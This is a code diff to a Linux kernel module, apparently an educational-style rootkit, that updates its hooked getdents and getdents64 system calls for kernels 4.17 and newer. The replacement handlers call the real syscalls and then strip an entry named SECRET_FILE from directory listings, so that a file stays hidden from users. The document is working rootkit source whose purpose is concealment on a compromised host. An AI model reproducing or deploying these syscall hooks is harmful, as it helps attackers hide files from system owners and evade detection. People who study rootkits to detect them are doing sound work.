@@ -23,6 +23,7 @@
 # include <linux/kernel.h>
 // linux_dirent64.
 # include <linux/dirent.h>
+# include <linux/version.h>
 # include <linux/syscalls.h>
 
 # include "zeroevil/zeroevil.h"
@@ -35,22 +36,46 @@ MODULE_LICENSE("GPL");
 unsigned long **sct;
 
 asmlinkage long
-(*real_getdents)(unsigned int fd,
+(*real_getdents)(
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+                 unsigned int fd,
                  struct linux_dirent __user *dirent,
-                 unsigned int count);
+                 unsigned int count
+#else
+                 struct pt_regs *regs
+#endif
+                 );
 asmlinkage long
-fake_getdents(unsigned int fd,
+fake_getdents(
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+              unsigned int fd,
               struct linux_dirent __user *dirent,
-              unsigned int count);
+              unsigned int count
+#else
+              struct pt_regs *regs
+#endif
+              );
 
 asmlinkage long
-(*real_getdents64)(unsigned int fd,
+(*real_getdents64)(
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+                   unsigned int fd,
                    struct linux_dirent64 __user *dirent,
-                   unsigned int count);
+                   unsigned int count
+#else
+              struct pt_regs *regs
+#endif
+                   );
 asmlinkage long
-fake_getdents64(unsigned int fd,
+fake_getdents64(
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+                unsigned int fd,
                 struct linux_dirent64 __user *dirent,
-                unsigned int count);
+                unsigned int count
+#else
+              struct pt_regs *regs
+#endif
+                );
 
 
 int
@@ -85,13 +110,32 @@ cleanup_module(void)
 
 
 asmlinkage long
-fake_getdents(unsigned int fd,
+fake_getdents(
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+              unsigned int fd,
               struct linux_dirent __user *dirent,
-              unsigned int count)
+              unsigned int count
+#else
+              struct pt_regs *regs
+#endif
+              )
 {
-    long ret;
+    long ret = 0;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+    /* unsigned int fd = regs->di; */
+    struct linux_dirent __user *dirent = (struct linux_dirent __user *)regs->si;
+    /* unsigned int count = regs->dx; */
+#endif
 
-    ret = real_getdents(fd, dirent, count);
+    fm_info("Entered %s", __func__);
+
+    ret = real_getdents(
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+                        regs
+#else
+                        fd, dirent, count
+#endif
+                        );
 
     print_dents(dirent, ret);
     ret = remove_dent(SECRET_FILE, dirent, ret);
@@ -103,13 +147,32 @@ fake_getdents(unsigned int fd,
 
 // INFO: It was triggered on a Kali i686-pae installation.
 asmlinkage long
-fake_getdents64(unsigned int fd,
+fake_getdents64(
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+                unsigned int fd,
                 struct linux_dirent64 __user *dirent,
-                unsigned int count)
+                unsigned int count
+#else
+              struct pt_regs *regs
+#endif
+                )
 {
-    long ret;
+    long ret = 0;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+    /* unsigned int fd = regs->di; */
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
+    /* unsigned int count = regs->dx; */
+#endif
 
-    ret = real_getdents64(fd, dirent, count);
+    fm_info("Entered %s", __func__);
+
+    ret = real_getdents64(
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+                          regs
+#else
+                          fd, dirent, count
+#endif
+                          );
 
     print_dents64(dirent, ret);
     ret = remove_dent64(SECRET_FILE, dirent, ret);
